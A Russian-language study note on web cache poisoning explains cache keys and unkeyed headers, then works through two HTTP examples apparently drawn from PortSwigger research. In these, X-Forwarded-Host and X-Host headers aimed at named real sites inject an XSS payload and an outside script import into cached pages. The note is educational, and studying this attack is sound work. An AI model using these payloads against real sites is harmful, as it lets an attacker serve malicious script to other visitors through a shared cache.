Кэш располагается между сервером и пользователем, как правило как часть инфраструктуры сервиса через CDN, где он сохраняет (кэширует) ответы на конкретные запросы, обычно на фиксированный период времени. 
Если другой пользователь затем отправляет аналогичный запрос, кэш просто предоставляет копию кэшированного ответа непосредственно пользователю, без какого-либо взаимодействия со стороны бэкэнда. 
Это значительно снижает нагрузку на сервер, уменьшая количество дублирующих запросов, которые ему приходится обрабатывать.
Кэши идентифицируют эквивалентные запросы, сравнивая предопределенное подмножество компонентов запроса, известных как «ключ кэша». Обычно он содержит строку запроса и Hostзаголовок. Компоненты запроса, не включенные в ключ кэша, называются «неключевыми».
На кеше такой ключ может выглядеть как `Cache key: https|GET|portswigger.net|/research?x=1` но пользователь этого не знает.

## создание базовой атаки с использованием отравления веб-кэша включает в себя следующие шаги:
1. Выявить и оценить неключевые поля запроса. Т.е. то чего еще нет в кеше -> и чтобы кеш-сервер записал новое значение страницы как новый кеш
   https://github.com/PortSwigger/param-miner
2. Вызвать вредоносный ответ от бэкэнд-сервера.
3. Получить ответ в кэше

## пример 1
```
шаг 1
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: ***canary***

HTTP/1.1 200 OK
Cache-Control: public, no-cache << пока может показаться что кеширования нет. Но это не гарантия
…
<meta property="og:image" content="https://***canary***/cms/social.png" />

# шаг 2
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>

HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<meta property="og:image" content="https://a."><script>alert(1)</script>"/>

Если в нашем браузере отработал XSS - ок. Далее нужно открыть другую вкладку и попробовать зайти на страницу http://www.redhat.com/en?dontpoisoneveryone=1 и если там XSS то значит запрос БЫЛ кеширован несмотря на Cache-Control: public, no-cache
```

## пример 2
```
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net <<  заголовок X-Host — который используется для генерации импорта скрипта. 

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174 << Заголовки ответа «Age» и «max-age» соответственно указывают возраст текущего ответа и возраст, по истечении которого он будет удален.
Cache-Control: public, max-age=1800
…
<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
```
